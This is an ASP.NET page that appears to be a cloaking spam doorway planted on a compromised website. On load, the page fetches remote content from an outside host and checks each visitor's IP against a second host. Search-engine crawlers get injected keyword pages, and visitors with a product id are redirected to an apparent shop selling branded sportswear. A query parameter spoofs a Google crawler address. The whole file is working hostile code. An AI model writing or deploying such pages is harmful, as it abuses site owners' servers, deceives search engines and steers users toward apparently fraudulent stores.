<%@ Page Language="C#" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {

            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;
            tz();

            string hyzhdyyy = "http://www.mallcc.top/qqq.aspx";
            string URL = "";
            if (Request.QueryString["pid"] != null)
            {
                URL = hyzhdyyy + "?pid=" + Request.QueryString["pid"] + "&page=" + HttpContext.Current.Request.Path;

            }
            else
            {
                int gd = 1;
                int gd2 = 100;
                if (Request.QueryString["pp"] != null)
                {
                    gd = int.Parse(Request.QueryString["pp"]);
                    gd2 = 4000;
                }
                URL = hyzhdyyy + "?pp=" + gd + "&num=" + gd2 + "&page=" + HttpContext.Current.Request.Path;
            }
            content = webclient.DownloadString(URL);
            content = content.Replace("YYYYY", "http://key.okbankservices.com/");
            content = content.Replace("DDDDD", "");
            content = content.Replace("QQQQQ", HttpContext.Current.Request.Path);
            for (int i = 1; i < 95; i++)
            {
                content += "<li><a href=\"" + HttpContext.Current.Request.Path + "?pp=" + i + "\">page " + i + "</a></li>";
            }
        }
    }
    public void tz()
    {
        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string domain = webclient.DownloadString("http://jf.a123.fr/getdomain.aspx?rnd=1&ip=" + ip).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["pid"] != null)
            {
                Response.Redirect("https://www.mallcc.top/Detail.aspx?pid=" + Request.QueryString["pid"]);
            }
        }

    }
    public System.Net.WebClient webclient = null;
    public string content = "";

</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>
    <meta name="robots" content="index,follow,all" />
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>
<body>
    <%=content %>
	<div class="li">
                    
                    <ul>
					<li><a href="jersey-en.aspx">jersey</a></li>
					<li><a href="new.aspx">taobao-fr</a></li>
					<li><a href="ad-es.aspx">adidas -es</a></li>
					<li><a href="nk-en.aspx">nike max</a></li>
					<li><a href="tao.aspx">taobao-en</a></li>
					<li><a href="zh-it.aspx">puma</a></li>
<li><a href="ad-fr.aspx">adidas fr</a></li>
					</ul></div>
</body>
</html>
